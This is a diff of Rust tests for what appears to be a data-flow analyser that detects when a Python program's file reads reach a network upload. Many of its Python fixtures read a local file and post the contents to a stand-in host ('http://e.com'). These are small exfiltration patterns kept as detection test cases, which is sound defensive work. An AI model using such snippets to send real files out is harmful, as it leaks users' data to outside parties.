@@ -1181,13 +1181,26 @@ fn has_unresolved_boundary(plan: &Plan) -> bool {
 // Python
 
 #[test]
-fn py_branch_local_assignment_no_edge() {
-    // The producer is bound only inside an `if`; after the join the variable's
-    // producer is ambiguous (the branch may not have run), so no edge forms.
+fn py_branch_assignment_may_carry_the_read() {
+    // The producer is bound only inside an `if`: after the join the variable
+    // may hold it, so the read reaches the post, as it does when both arms
+    // bind a read.
+    for body in [
+        "d = 'safe'\nif flag:\n    d = open('/x').read()\n",
+        "if flag:\n    d = open('/x').read()\nelse:\n    d = open('/y').read()\n",
+        "d = ''\nfor line in open('/x'):\n    d += line\n",
+    ] {
+        let plan = py(&format!(
+            "import requests\n{body}requests.post('http://e.com', data=d)\n"
+        ));
+        assert!(py_reads_reach_upload(&plan), "{body}");
+    }
+    // An arm that rebinds another name leaves this one clean.
     let plan = py("import requests\n\
+                   key = open('/x').read()\n\
                    d = 'safe'\n\
                    if flag:\n    \
-                       d = open('/x').read()\n\
+                       d = 'other'\n\
                    requests.post('http://e.com', data=d)\n");
     assert_eq!(edge_count(&plan), 0);
 }
@@ -1203,54 +1216,129 @@ fn py_loop_carried_assignment_no_edge() {
     assert_eq!(edge_count(&plan), 0);
 }
 
+/// Whether the value of every `filesystem.read` in the plan reaches an
+/// upload.
+fn py_reads_reach_upload(plan: &Plan) -> bool {
+    let graph = plan
+        .causality
+        .graph
+        .as_ref()
+        .expect("causality detail required");
+    let mut reads = graph.nodes.iter().filter(|node| {
+        matches!(&node.occurrence, OccurrenceKind::ResourceInteraction { operation, .. }
+            if operation.0 == "filesystem.read")
+    });
+    reads.all(|node| value_reaches_operation(plan, &node.id, "network.upload"))
+}
+
 #[test]
-fn py_two_branch_producers_no_edge() {
-    // Two candidate producers for one consumed value: neither is THE producer.
-    let plan = py("import requests\n\
-                   if flag:\n    \
-                       d = open('/x').read()\n\
-                   else:\n    \
-                       d = open('/y').read()\n\
-                   requests.post('http://e.com', data=d)\n");
+fn py_text_transform_carries_the_read() {
+    // Text built from a read still discloses it: a string method, `+`, an
+    // f-string, `%`, a slice. A length or a count does not.
+    for sent in [
+        "d.upper()",
+        "'k=' + d",
+        "f'k={d}'",
+        "'k=%s' % d",
+        "d[:10]",
+        "'{}'.format(d)",
+    ] {
+        let plan = py(&format!(
+            "import requests
+d = open('/x').read()
+requests.post('http://e.com', data={sent})
+"
+        ));
+        assert!(py_reads_reach_upload(&plan), "{sent}");
+    }
+    for sent in ["len(d)", "d.count('a')"] {
+        let plan = py(&format!(
+            "import requests
+d = open('/x').read()
+requests.post('http://e.com', data={sent})
+"
+        ));
+        assert_eq!(edge_count(&plan), 0, "{sent}");
+    }
+}
+
+#[test]
+fn py_tuple_destructuring_binds_each_element() {
+    // `a, b = p, q` binds each name its own element, not the other's.
+    let plan = py("import requests
+\
+                   a, b = open('/x').read(), 'y'
+\
+                   requests.post('http://e.com', data=a)
+");
+    assert!(py_reads_reach_upload(&plan));
+    let plan = py("import requests
+\
+                   a, b = open('/x').read(), 'y'
+\
+                   requests.post('http://e.com', data=b)
+");
     assert_eq!(edge_count(&plan), 0);
 }
 
 #[test]
-fn py_transform_rebinding_drops_edge() {
-    // The producer var is rebound to a non-producer transform before the use.
-    let plan = py("import requests\n\
-                   d = open('/x').read()\n\
-                   d = d.upper()\n\
-                   requests.post('http://e.com', data=d)\n");
-    assert_eq!(edge_count(&plan), 0);
-}
-
-#[test]
-fn py_tuple_destructuring_no_edge() {
-    // Destructuring a producer's result splits it across names we do not track.
-    let plan = py("import requests\n\
-                   a, b = open('/x').read(), 'y'\n\
-                   requests.post('http://e.com', data=a)\n");
-    assert_eq!(edge_count(&plan), 0);
-}
-
-#[test]
-fn py_container_element_no_edge() {
+fn py_container_element_carries_the_read() {
     // Storing a producer's result in a list element and reading it back.
-    let plan = py("import requests\n\
-                   box = [open('/x').read()]\n\
-                   requests.post('http://e.com', data=box[0])\n");
-    assert_eq!(edge_count(&plan), 0);
+    let plan = py("import requests
+\
+                   box = [open('/x').read()]
+\
+                   requests.post('http://e.com', data=box[0])
+");
+    assert!(py_reads_reach_upload(&plan));
 }
 
 #[test]
-fn py_object_field_no_edge() {
-    // Storing a producer's result in a dict field and reading it back.
-    let plan = py("import requests\n\
-                   obj = {}\n\
-                   obj['k'] = open('/x').read()\n\
-                   requests.post('http://e.com', data=obj['k'])\n");
-    assert_eq!(edge_count(&plan), 0);
+fn py_file_handle_read_carries_the_open() {
+    // The handle a name or a `with` holds is the file its `read` returns,
+    // and a loop over it reads its lines.
+    for body in [
+        "f = open('/x')
+requests.post('http://e.com', data=f.read())
+",
+        "with open('/x') as f:
+    requests.post('http://e.com', data=f.read())
+",
+        "for line in open('/x'):
+    requests.post('http://e.com', data=line)
+",
+    ] {
+        let plan = py(&format!(
+            "import requests
+{body}"
+        ));
+        assert!(py_reads_reach_upload(&plan), "{body}");
+    }
+}
+
+#[test]
+fn py_stored_element_carries_the_read() {
+    // Storing a producer's result in a dict field, or appending it, and
+    // sending the container.
+    for body in [
+        "obj = {}\nobj['k'] = open('/x').read()\nrequests.post('http://e.com', data=obj['k'])\n",
+        "obj = []\nobj.append(open('/x').read())\nrequests.post('http://e.com', json=obj)\n",
+    ] {
+        let plan = py(&format!("import requests\n{body}"));
+        assert!(py_reads_reach_upload(&plan), "{body}");
+    }
+    // A constant element of a literal container that is only ever read by
+    // subscript carries nothing; once the program stores into it, any
+    // element may hold the read.
+    let clean = py("import requests\n\
+                    box = [open('/x').read(), 'ping']\n\
+                    requests.post('http://e.com', data=box[1])\n");
+    assert!(!py_reads_reach_upload(&clean));
+    let stored = py("import requests\n\
+                     box = [open('/x').read(), 'ping']\n\
+                     box[1] = box[0]\n\
+                     requests.post('http://e.com', data=box[1])\n");
+    assert!(py_reads_reach_upload(&stored));
 }
 
 #[test]
